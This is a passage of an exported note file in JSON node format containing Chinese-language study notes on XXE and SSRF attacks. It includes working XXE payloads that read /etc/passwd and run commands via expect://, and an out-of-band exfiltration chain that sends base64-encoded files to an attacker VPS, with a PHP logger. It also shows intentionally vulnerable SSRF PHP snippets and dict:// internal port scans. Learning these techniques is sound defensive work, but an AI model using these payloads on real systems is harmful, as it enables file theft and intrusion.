text/xml"}]},{"ID":"20240919164330-pdpz7wn","Type":"NodeParagraph","Properties":{"id":"20240919164330-pdpz7wn","updated":"20240919164330"},"Children":[{"Type":"NodeText","Data":"2、确定是否有回显位置，或无回显"}]},{"ID":"20240919164331-lagikux","Type":"NodeParagraph","Properties":{"id":"20240919164331-lagikux","updated":"20240919164331"},"Children":[{"Type":"NodeText","Data":"3、攻击payload"}]},{"ID":"20240919164332-bhsvtsr","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240919164332-bhsvtsr","updated":"20240919164332"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"具体危害"}]},{"ID":"20240919164333-ih9r2uo","Type":"NodeHeading","HeadingLevel":6,"Properties":{"id":"20240919164333-ih9r2uo","updated":"20240919164333"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"###### ","Properties":{"id":""}},{"Type":"NodeText","Data":"1、读文件"}]},{"ID":"20240919164334-lj5v3su","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164334-lj5v3su","updated":"20240919164334"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE ANY[\n\u003c!ENTITY a SYSTEM \"file:///etc/passwd\"\u003e\n]\u003e\n\n\u003cuser\u003e\n\u003cusername\u003e\u0026a;\u003c/username\u003e\n\u003cpassword\u003eaadaddadaddadadad3r\u003c/password\u003e\n\u003c/user\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164335-is732qb","Type":"NodeParagraph","Properties":{"id":"20240919164335-is732qb","updated":"20240919164335"},"Children":[{"Type":"NodeText","Data":"外部参数实体,攻击payload:"}]},{"ID":"20240919164336-48hlv73","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164336-48hlv73","updated":"20240919164336"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE ANY[\n\u003c!ENTITY % a SYSTEM \"http://121.43.49.39:8000/1.dtd\"\u003e\n%a;\n]\u003e\n\n\u003cuser\u003e\n\u003cusername\u003e\u0026xxe;\u003c/username\u003e\n\u003cpassword\u003eaadaddadaddadadad3r\u003c/password\u003e\n\u003c/user\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164337-6556fdz","Type":"NodeParagraph","Properties":{"id":"20240919164337-6556fdz","updated":"20240919164337"},"Children":[{"Type":"NodeText","Data":"1.dtd"}]},{"ID":"20240919164338-8liaw3r","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164338-8liaw3r","updated":"20240919164338"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164339-rfq9ajk","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164339-rfq9ajk","updated":"20240919164339"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"2、探测端口是否开放"}]},{"ID":"20240919164340-6rocc6m","Type":"NodeParagraph","Properties":{"id":"20240919164340-6rocc6m","updated":"20240919164340"},"Children":[{"Type":"NodeText","Data":"通过回显长度或页面特征判断"}]},{"ID":"20240919164341-ey8umet","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20240919164341-ey8umet","updated":"20240919164341"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker"},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE ANY[\n\u003c!ENTITY a SYSTEM \"http://113.45.183.4:888\"\u003e\n]\u003e\n\n\u003cuser\u003e\n\u003cusername\u003e\u0026a;\u003c/username\u003e\n\u003cpassword\u003eaadaddadaddadadad3r\u003c/password\u003e\n\u003c/user\u003e\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20240919164342-eamkxl4","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164342-eamkxl4","updated":"20240919164342"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"3、命令执行（前提：需要php环境安装了expect扩展）"}]},{"ID":"20240919164343-bdqkluy","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164343-bdqkluy","updated":"20240919164343"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE ANY[\n\u003c!ENTITY s SYSTEM \"expect://whoami\"\u003e\t\t#空格可使用${IFS}替换\n]\u003e\n\u003cuser\u003e\u003cusername\u003e\u0026s;\u003c/username\u003e\u003cpassword\u003eadmin2\u003c/password\u003e\u003c/user\u003e\n\nexpect://ls${IFS}-al\t\t#举例\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164344-k3pe3c4","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240919164344-k3pe3c4","updated":"20240919164344"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"没有回显的XXE"}]},{"ID":"20240919164345-vfh6r0c","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164345-vfh6r0c","updated":"20240919164345"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"1、文件记录"}]},{"ID":"20240919164346-l2jq5ly","Type":"NodeParagraph","Properties":{"id":"20240919164346-l2jq5ly","updated":"20240919164346"},"Children":[{"Type":"NodeText","Data":"读web下的所有文件，非web下的文件需要配合文件包含漏洞"}]},{"ID":"20240919164347-bec1k9a","Type":"NodeParagraph","Properties":{"id":"20240919164347-bec1k9a","updated":"20240919164347"},"Children":[{"Type":"NodeText","Data":"payload："}]},{"ID":"20240919164348-owcmdpl","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164348-owcmdpl","updated":"20240919164348"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003c!DOCTYPE ANY[\n\u003c!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=doLogin.php\"\u003e\n\u003c!ENTITY % s SYSTEM \"http://192.168.61.17/xxe/110.dtd\"\u003e\n%s;\n%send;\n]\u003e\n\n\u003cuser\u003e\n\u003cusername\u003eaa\u003c/username\u003e\n\u003cpassword\u003eaadaddadaddadadad3r\u003c/password\u003e\n\u003c/user\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164349-kqy191m","Type":"NodeParagraph","Properties":{"id":"20240919164349-kqy191m","updated":"20240919164349"},"Children":[{"Type":"NodeText","Data":"三方vps放置：http://192.168.61.17/xxe/110.dtd的内容："}]},{"ID":"20240919164350-lx3yv1p","Type":"NodeParagraph","Properties":{"id":"20240919164350-lx3yv1p","updated":"20240919164350"},"Children":[{"Type":"NodeText","Data":"（目的：通过XML外部实体调用攻击机的xxe.php来记录文件）"}]},{"ID":"20240919164351-5gq91dv","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164351-5gq91dv","updated":"20240919164351"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c!ENTITY % a \"\u003c!ENTITY \u0026#37; send SYSTEM 'http://192.168.61.17/xxe/xxe.php?get=%file;'\u003e\"\u003e\n%a;\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164352-8muk9f8","Type":"NodeParagraph","Properties":{"id":"20240919164352-8muk9f8","updated":"20240919164352"},"Children":[{"Type":"NodeText","Data":"三方vps放置：http://192.168.61.17/xxe/xxe.php  记录读取内容"}]},{"ID":"20240919164353-fnzpxjt","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164353-fnzpxjt","updated":"20240919164353"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?php\nfile_put_contents('xxx.txt',$_GET['get']);\n?\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164354-3f8y0ce","Type":"NodeParagraph","Properties":{"id":"20240919164354-3f8y0ce","updated":"20240919164354"},"Children":[{"Type":"NodeText","Data":"三方VPS生成：读取后的内容输出在xxx.txt中"}]},{"ID":"20240919164355-64jfk11","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164355-64jfk11","updated":"20240919164355"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"PD9waHAKLyoqCiogYXV0b3I6IGMwbnkxCiogZGF0ZTogMjAxOC0yLTcKKi8KCiRVU0VSTkFNRSA9ICdhZG1pbic7IC8v6LSm5Y 3CiRQQVNTV09SRCA9ICdhZG1pbic7IC8v5a G56CBCiRyZXN1bHQgPSBudWxsOwoKbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlcihmYWxzZSk7CiR4bWxmaWxlID0gZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7Cgp0cnl7CgkkZG9tID0gbmV3IERPTURvY3VtZW50KCk7CgkkZG9tLT5sb2FkWE1MKCR4bWxmaWxlLCBMSUJYTUxfTk9FTlQgfCBMSUJYTUxfRFRETE9BRCk7CgkkY3JlZHMgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCgkkdXNlcm5hbWUgPSAkY3JlZHMtPnVzZXJuYW1lOwoJJHBhc3N3b3JkID0gJGNyZWRzLT5wYXNzd29yZDsKCglpZigkdXNlcm5hbWUgPT0gJFVTRVJOQU1FICYmICRwYXNzd29yZCA9PSAkUEFTU1dPUkQpewoJCSRyZXN1bHQgPSBzcHJpbnRmKCI8cmVzdWx0Pjxjb2RlPiVkPC9jb2RlPjxtc2c JXM8L21zZz48L3Jlc3VsdD4iLDEsJHVzZXJuYW1lKTsKCX1lbHNlewoJCSRyZXN1bHQgPSBzcHJpbnRmKCI8cmVzdWx0Pjxjb2RlPiVkPC9jb2RlPjxtc2c JXM8L21zZz48L3Jlc3VsdD4iLDAsJHVzZXJuYW1lKTsKCX0JCn1jYXRjaChFeGNlcHRpb24gJGUpewoJJHJlc3VsdCA9IHNwcmludGYoIjxyZXN1bHQ PGNvZGU JWQ8L2NvZGU PG1zZz4lczwvbXNnPjwvcmVzdWx0PiIsMywkZS0 Z2V0TWVzc2FnZSgpKTsKfQoKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOCcpOwplY2hvICRyZXN1bHQ7Cj8 \n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164356-3hvzv28","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164356-3hvzv28","updated":"20240919164356"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"2、access.log日志"}]},{"ID":"20240919164357-hr82977","Type":"NodeParagraph","Properties":{"id":"20240919164357-hr82977","updated":"20240919164357"},"Children":[{"Type":"NodeText","Data":"payload 同上"}]},{"ID":"20240919164358-2ia4a7g","Type":"NodeParagraph","Properties":{"id":"20240919164358-2ia4a7g","updated":"20240919164358"},"Children":[{"Type":"NodeText","Data":"变化的内容,VPSde dtd文件"}]},{"ID":"20240919164359-2bssm1g","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164359-2bssm1g","updated":"20240919164359"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c!ENTITY % a \"\u003c!ENTITY \u0026#37; send SYSTEM 'http://192.168.61.17/?get=%file;'\u003e\"\u003e\n%a;\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164360-qp01r4k","Type":"NodeParagraph","Properties":{"id":"20240919164360-qp01r4k","updated":"20240919164360"},"Children":[{"Type":"NodeText","Data":"access。log日志内查看结果"}]},{"ID":"20240919164361-28z7rxi","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164361-28z7rxi","updated":"20240919164361"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"代码审计的部分"}]},{"ID":"20240919164362-e8u4txe","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164362-e8u4txe","updated":"20240919164362"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"XXE漏洞代码审计方法:\n\nsimplexml_load_string() \nsimplexml_import_dom() 实例化xml文档函数\nlibxml_disable_entity_loader(false); \n开启引用外部实体\n\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164363-uy1550h","Type":"NodeHeading","HeadingLevel":1,"Properties":{"id":"20240919164363-uy1550h","updated":"20240919164363"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"# ","Properties":{"id":""}},{"Type":"NodeText","Data":"SSRF  服务端请求伪造"}]},{"ID":"20240919164364-awu084d","Type":"NodeParagraph","Properties":{"id":"20240919164364-awu084d","updated":"20240919164364"},"Children":[{"Type":"NodeText","Data":"是一种由攻击者构造形成由服务端发起请求的安全漏洞"}]},{"ID":"20240919164365-c6t10cs","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240919164365-c6t10cs","updated":"20240919164365"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"常出现的位置"}]},{"ID":"20240919164366-x9c9mat","Type":"NodeParagraph","Properties":{"id":"20240919164366-x9c9mat","updated":"20240919164366"},"Children":[{"Type":"NodeText","Data":"1、分享网站。。。。。http://www.baidu.com?url=http://ccc.com"}]},{"ID":"20240919164367-a6x4a63","Type":"NodeParagraph","Properties":{"id":"20240919164367-a6x4a63","updated":"20240919164367"},"Children":[{"Type":"NodeText","Data":"转码服务"},{"Type":"NodeSoftBreak","Data":"\n","Properties":{"id":""}},{"Type":"NodeText","Data":"在线翻译"},{"Type":"NodeSoftBreak","Data":"\n","Properties":{"id":""}},{"Type":"NodeText","Data":"图片加载与下载：通过URL地址加载或下载图片"},{"Type":"NodeSoftBreak","Data":"\n","Properties":{"id":""}},{"Type":"NodeText","Data":"图片、文章收藏功能"},{"Type":"NodeSoftBreak","Data":"\n","Properties":{"id":""}},{"Type":"NodeText","Data":"未公开的api实现以及其他调用URL的功能"},{"Type":"NodeSoftBreak","Data":"\n","Properties":{"id":""}},{"Type":"NodeText","Data":"从URL关键字中寻找"}]},{"ID":"20240919164368-417153o","Type":"NodeParagraph","Properties":{"id":"20240919164368-417153o","updated":"20240919164368"},"Children":[{"Type":"NodeText","Data":"url关键字："}]},{"ID":"20240919164369-4lpi7if","Type":"NodeParagraph","Properties":{"id":"20240919164369-4lpi7if","updated":"20240919164369"},"Children":[{"Type":"NodeText","Data":"location=??    url=       src=   source=    urlname=  filenme= link= local= fileurl= imageurl= imglink=   domain="}]},{"ID":"20240919164370-zrvts8k","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20240919164370-zrvts8k","updated":"20240919164370"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"#### ","Properties":{"id":""}},{"Type":"NodeText","Data":"原理"}]},{"ID":"20240919164371-ein6lfe","Type":"NodeParagraph","Properties":{"id":"20240919164371-ein6lfe","updated":"20240920183147"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image-20240919143551593"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"C:\\Users\\neo\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240919143551593.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20240919164372-hr9hiyy","Type":"NodeHeading","HeadingLevel":5,"Properties":{"id":"20240919164372-hr9hiyy","updated":"20240919164372"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"##### ","Properties":{"id":""}},{"Type":"NodeText","Data":"危害"}]},{"ID":"20240919164373-9p5asnz","Type":"NodeParagraph","Properties":{"id":"20240919164373-9p5asnz","updated":"20240919164373"},"Children":[{"Type":"NodeText","Data":"1、读文件"}]},{"ID":"20240919164374-al5i201","Type":"NodeParagraph","Properties":{"id":"20240919164374-al5i201","updated":"20240919164374"},"Children":[{"Type":"NodeText","Data":"2、扫描端口，探测服务"}]},{"ID":"20240919164375-hgoaavg","Type":"NodeParagraph","Properties":{"id":"20240919164375-hgoaavg","updated":"20240919164375"},"Children":[{"Type":"NodeText","Data":"3、web指纹识别"}]},{"ID":"20240919164376-3tlfke1","Type":"NodeParagraph","Properties":{"id":"20240919164376-3tlfke1","updated":"20240919164376"},"Children":[{"Type":"NodeText","Data":"4、作为跳板机，攻击内网其他服务（web\\数据库）"}]},{"ID":"20240919164377-no3hpeu","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240919164377-no3hpeu","updated":"20240919164377"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"产生的函数"}]},{"ID":"20240919164378-1y2ntcx","Type":"NodeParagraph","Properties":{"id":"20240919164378-1y2ntcx","updated":"20240919164378"},"Children":[{"Type":"NodeText","Data":"1、file_get_contents()       可以从用户指定的ur中获取内同，然后指定一个文件名进行保护，展示给用户"}]},{"ID":"20240919164379-sewovba","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164379-sewovba","updated":"20240919164379"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"http://localhost/ssrf/ssrf1.php?url=http://www.baidu.com\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164380-5qymeuz","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164380-5qymeuz","updated":"20240919164380"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?php\n$url = $_GET['url'];;\necho file_get_contents($url);\n?\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164381-82679o0","Type":"NodeParagraph","Properties":{"id":"20240919164381-82679o0","updated":"20240919164381"},"Children":[{"Type":"NodeText","Data":"2、fsockopen()  创建socket服务，建立tcp链接，传输数据"}]},{"ID":"20240919164382-dclfc3j","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164382-dclfc3j","updated":"20240919164382"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?php \nfunction GetFile($host,$port,$link) { \n    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);   \n    if (!$fp) {\n        echo \"$errstr (error number $errno) \\n\"; \n    } else { \n        $out = \"GET $link HTTP/1.1\\r\\n\"; \n        $out .= \"Host: $host\\r\\n\"; \n        $out .= \"Connection: Close\\r\\n\\r\\n\"; \n        $out .= \"\\r\\n\"; \n        fwrite($fp, $out); \n        $contents=''; \n        while (!feof($fp)) { \n            $contents.= fgets($fp, 1024); \n        } \n        fclose($fp); \n        return $contents; \n    } \n}\n// 示例: 访问内网服务\n$host = '127.0.0.1'; // 内网地址\n$port = $_GET['port']; // HTTP 服务端口\n$link = $_GET['url'];\n$response = GetFile($host, $port, $link);\necho \"$response\";\n?\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164383-fzichhi","Type":"NodeParagraph","Properties":{"id":"20240919164383-fzichhi","updated":"20240919164383"},"Children":[{"Type":"NodeText","Data":"3、curl_exec()  创建curl会话"}]},{"ID":"20240919164384-y2a5ody","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164384-y2a5ody","updated":"20240919164384"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"\u003c?php\n$ch = curl_init();\t\t//创建curl资源\ncurl_setopt($ch, CURLOPT_URL, $_GET['url']);\t//指定url地址，为用户可控参数?url=\n#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\t//跟随加载，默认是不会跟随加载的\ncurl_setopt($ch, CURLOPT_HEADER, 0);\t//设置请求头\n#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);\ncurl_exec($ch);\t\t//抓取URL传递给浏览器\ncurl_close($ch);\t//关闭并释放curl资源\n?\u003e\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164385-f858l87","Type":"NodeParagraph","Properties":{"id":"20240919164385-f858l87","updated":"20240919164385"},"Children":[{"Type":"NodeText","Data":"其他函数：fopen()     readfie()"}]},{"ID":"20240919164386-joelz0c","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240919164386-joelz0c","updated":"20240919164386"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"如何判定是否存在漏洞"}]},{"ID":"20240919164387-419gtse","Type":"NodeParagraph","Properties":{"id":"20240919164387-419gtse","updated":"20240919164387"},"Children":[{"Type":"NodeText","Data":"1、http://localhost/sssr.php?url=http://www.baidu.com  指定了非本机的url地址（SSO统一认证）"}]},{"ID":"20240919164388-lnamz5l","Type":"NodeParagraph","Properties":{"id":"20240919164388-lnamz5l","updated":"20240919164388"},"Children":[{"Type":"NodeText","Data":"2、抓包盲打"}]},{"ID":"20240919164389-gldhnt6","Type":"NodeParagraph","Properties":{"id":"20240919164389-gldhnt6","updated":"20240919164389"},"Children":[{"Type":"NodeText","Data":"3、根据页面回显，类似于布尔"}]},{"ID":"20240919164390-yekmp2l","Type":"NodeHeading","HeadingLevel":3,"Properties":{"id":"20240919164390-yekmp2l","updated":"20240919164390"},"Children":[{"Type":"NodeHeadingC8hMarker","Data":"### ","Properties":{"id":""}},{"Type":"NodeText","Data":"利用方式"}]},{"ID":"20240919164391-kx346ar","Type":"NodeParagraph","Properties":{"id":"20240919164391-kx346ar","updated":"20240919164391"},"Children":[{"Type":"NodeText","Data":"1、扫描内网的端口和服务"}]},{"ID":"20240919164392-fkcphlk","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164392-fkcphlk","updated":"20240919164392"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"http://192.168.188.129/ssrf3.php?url=dict://192.168.188.130:8888\n#根据页面回显判定端口是否开放\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}}]},{"ID":"20240919164393-ammr2r2","Type":"NodeParagraph","Properties":{"id":"20240919164393-ammr2r2","updated":"20240919164393"},"Children":[{"Type":"NodeText","Data":"2、探测内网指纹信息"}]},{"ID":"20240919164394-vfsz94w","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"CodeBlockFenceChar":96,"CodeBlockFenceLen":3,"CodeBlockOpenFence":"YGBg","CodeBlockCloseFence":"YGBg","Properties":{"id":"20240919164394-vfsz94w","updated":"20240919164394"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```","CodeBlockFenceLen":3,"Properties":{"id":""}},{"Type":"NodeCodeBlockFenceInfoMarker","Properties":{"id":""}},{"Type":"NodeCodeBlockCode","Data":"http://192.168.188.129/ssrf3.php?url=192.168.188.130:80\n#直接根据页面的内容来判定是什么服务\n","Properties":{"id":""}},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```","CodeBlockFe